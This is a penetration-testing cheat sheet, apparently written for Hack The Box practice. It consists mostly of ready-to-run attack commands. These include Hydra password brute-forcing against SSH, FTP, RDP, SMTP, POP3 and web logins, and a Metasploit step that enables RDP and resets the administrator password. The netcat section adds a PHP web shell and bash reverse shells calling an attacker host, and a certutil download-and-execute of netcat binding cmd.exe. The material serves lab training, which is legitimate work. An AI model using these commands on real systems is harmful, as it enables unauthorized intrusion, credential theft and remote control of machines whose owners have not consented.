# Hackthebox
- default page ```/robots.txt``` ```/secret.txt```
- ```find / -name local.txt 2> /dev/null```
- ``` find -type d -name ".*" 2>/dev/null``` it will check hidden directories.
- [Useful_links](/links.md)
- [1. Nmap](/nmap.md)
- [2. BurpSuite](/burpsuite.md)
- [3. Gobuster](#gobuster)
- [4. FFUF](#ffuf)
- [5. Nikto](#nikto)
- [6. Mysql](#mysql)
- [7. Cewl](#cewl) - It is use to create a worldlist using website link
- [8. Hydra](#hydra) - Brute force attack on ssh
- [9.FTP](#ftp)
- [10. Password Cracking](/hash_cracking.md)
- [11. RDP-3389](#rdp)
- [12. Metasploit](/metasploit.md)
- [13. netcat](#nc)
- [14. Reverse_Shell_Script](https://revshells.com)
- [15. Privilege escalation](/Privilege.md)
- [16. Simple Local Web Servers](#localweb)


# [1. Nmap](/nmap.md)

# [2. BurpSuite](/burpsuite.md)


# 3. Gobuster <a name="gobuster"></a>
```
gobuster dir -u <url> -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.60.132 -t 50 -x php,txt -o  gobuster.txt
```

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100 -x .html,.txt,.php > gobuster.txt
```  





# 4. FFUF <a name="ffuf"></a>
- FFUF is used to filter the invalid pages 
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r -fs 27200```
  - if you are getting the size same of all use filter size and give the size there.
```
ffuf -u http://test.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H ‘Host: FUZZ.test.com’ -fs 0 -fs 65
```





# 5. Nikto <a name="nikto"></a>
- ```nikto -h http://127.0.0.1```





# 6. Mysql <a name="mysql"></a>
- ```mysql -u root -p -h $ip```





# 7. Cewl <a name="cewl"></a>
- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```





# 8. Hydra <a name="hydra"></a>
- `hydra -C <combinations.txt> <ip> <service>`
- ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
- ```hydra -L users.txt -P passwords.txt ssh://192.168.245.48 -t 4 > hydra.txt```
- ```hydra -l root -P /usr/share/wordlists/rockyou.txt $ip mysql```
```
hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp
```
```
hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ftp
```
### Hydra POP3 Brute Force
```
hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3
```
### Hydra RDP
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>
```
### Hydra SMTP Brute Force
```
hydra -P /usr/share/wordlists/rockyou.txt 127.0.0.1 smtp -V
```
### Hydra SSH Brute Force
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
```
### Brute Forcing a Website Login
- Login page 
- http://127.0.0.0/DVWA/vulnerabilities/brute/index.php

- `hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"`





# 9. FTP <a name="ftp"></a>
```
nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0.1.22  -o namp
```
- ftp <ip>
  - user:anonymous
  - pass:
  - 230 Login successful
  - to upload a file use ```put <filename>```
  - to download a file use ```get <filename>```





# 10. [Password Cracking](/hash_cracking.md)






# 11. RDP-3389 <a name="rdp"></a>

- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /user/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`

- `xfreerdp /u:administrator /p:qwertyuiop /v:<target> ip:<port_number>`

- __`search enable_rdp`__
```
use post/windows/manage/enable_rdp
set sesstion 1
exploit
```
- __now you can change the password for the user in my case i have access to the administrator account__
- __so i have meterpreter session running in the background__
- __so use `shell`__
- __change the password__
- __`net user administrator password123`__
- > you have change the password of the admininstrator so that we can login using `xfreerdp` into rdp using this login
- __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__




# [12. Metasploit](/metasploit.md)




# 13. netcat <a name="nc"></a>
```php
<?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
?>
```
```Bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
__Download the reverse shell in windows__
  - > __First we need to host the file in your kali linux__
    - __`cd /usr/share/windows-binaries/`__
    - __`python -m SimpleHTTPServer 80`__
  - > __Go to the target windows system type the below command in the `cmd`__
    - __`certutil -urlcache -f http://<attacker_ip>/nc.exe net.exe`__
  - > __run the below command in kali linux__
    > __`nc -nvlp 1234`__
  - > __we need to run the file in target system__
    - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__


# [14. Reverse_Shell_Script](https://revshells.com)


# [15. Privilege escalation](/Privilege.md)



# 16. Simple Local Web Servers <a name="localweb"></a>

```
python -m SimpleHTTPServer 80
```

```
python3 -m http.server
```

```
php -S 0.0.0.0:80
```

